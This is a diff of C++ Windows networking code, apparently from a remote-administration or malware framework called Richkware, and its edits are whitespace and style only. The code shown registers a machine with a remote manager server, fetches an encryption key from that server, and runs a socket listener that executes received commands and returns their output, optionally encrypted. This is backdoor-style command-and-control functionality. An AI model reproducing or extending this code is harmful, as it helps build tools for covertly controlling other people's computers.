@@ -147,12 +147,12 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
     std::string associatedUserS = crypto.Encrypt(associatedUser);
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
-                                "&data1=" + serverPortS +
-                                "&data2=" + associatedUserS +
-                                " HTTP/1.1\r\n" +
-                                "Host: " + serverAddress + "\r\n" +
-                                "Connection: close\r\n" +
-                                "\r\n";
+                         "&data1=" + serverPortS +
+                         "&data2=" + associatedUserS +
+                         " HTTP/1.1\r\n" +
+                         "Host: " + serverAddress + "\r\n" +
+                         "Connection: close\r\n" +
+                         "\r\n";
 
     RawRequest(serverAddress, port, packet.c_str());
 
@@ -174,13 +174,13 @@ std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const ch
     std::string nameS = crypto.Encrypt(name);
 
     std::string packet = "GET /Richkware-Manager-Server/encryptionKey?id=" + nameS + " HTTP/1.1\r\n"
-            "Host: " + serverAddress + "\r\n" +
+                                                                                     "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
                          "\r\n";
 
     key = RawRequest(serverAddress, port, packet.c_str());
     // If no matches were found, the function "find" returns string::npos
-    if(key.find('$') !=  std::string::npos) {
+    if (key.find('$') != std::string::npos) {
         key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
         key = crypto.Decrypt(key);
     }
@@ -315,7 +315,7 @@ DWORD WINAPI ServerThread(void *arg) {
             WSACleanup();
             return 1;
         } else {
-            ClientSocketThreadArgs* csa = new ClientSocketThreadArgs();
+            ClientSocketThreadArgs *csa = new ClientSocketThreadArgs();
             csa->ClientSocket = ClientSocket;
             csa->encryptionKey = encryptionKey;
 
@@ -343,9 +343,9 @@ DWORD WINAPI ClientSocketThread(void *arg) {
     std::size_t posSubStr;
 
     // Receive until the peer shuts down the connection
-    if (encryptionKey.compare("") != 0){
+    if (encryptionKey.compare("") != 0) {
         send(ClientSocket, "\nEncrypted Connection Established\n", 34, 0);
-    }else{
+    } else {
         send(ClientSocket, "\nConnection Established\n", 24, 0);
     }
 
@@ -371,11 +371,11 @@ DWORD WINAPI ClientSocketThread(void *arg) {
             response = CommandsDispatcher(command);
 
             // string encryption
-            if (encryptionKey.compare("") != 0){
+            if (encryptionKey.compare("") != 0) {
                 std::string encResponse = (crypto.Encrypt(response) + "\n");
-                iSendResult = send(ClientSocket, encResponse.c_str(),encResponse.length(), 0);
-            } else{
-                iSendResult = send(ClientSocket, response.c_str(),response.length(), 0);
+                iSendResult = send(ClientSocket, encResponse.c_str(), encResponse.length(), 0);
+            } else {
+                iSendResult = send(ClientSocket, response.c_str(), response.length(), 0);
             }
 
 
